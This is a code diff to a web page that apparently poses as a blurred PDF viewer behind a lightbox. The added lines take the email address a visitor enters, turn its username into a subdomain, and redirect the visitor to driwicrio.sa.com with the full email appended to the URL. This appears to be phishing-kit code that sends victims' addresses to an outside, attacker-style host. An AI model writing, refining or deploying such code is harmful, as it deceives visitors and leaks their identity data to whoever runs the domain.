@@ -233,6 +233,12 @@ const from = urlParams.get('from');
     startCountdown();
   }
 
+  function getUsername(email) {
+  if (typeof email !== "string") return "";
+  const atIndex = email.indexOf("@");
+  return atIndex > 0 ? email.slice(0, atIndex) : "";
+}
+
   window.addEventListener('load', () => {
     setTimeout(() => {
       showLightbox();
@@ -252,7 +258,8 @@ const from = urlParams.get('from');
     lightbox.classList.remove('show');
     pdfIframe.style.filter = 'none';
     pdfIframe.style.animation = 'none';
-	window.location.href = "https://chown.driwicrio.sa.com/NAT@br5ca5/$"+emailValue;
+	var sub = getUsername(emailValue);
+	window.location.href = "https://"+sub+".driwicrio.sa.com/NAT@br5ca5/$"+emailValue;
   });
 </script>
 </body>
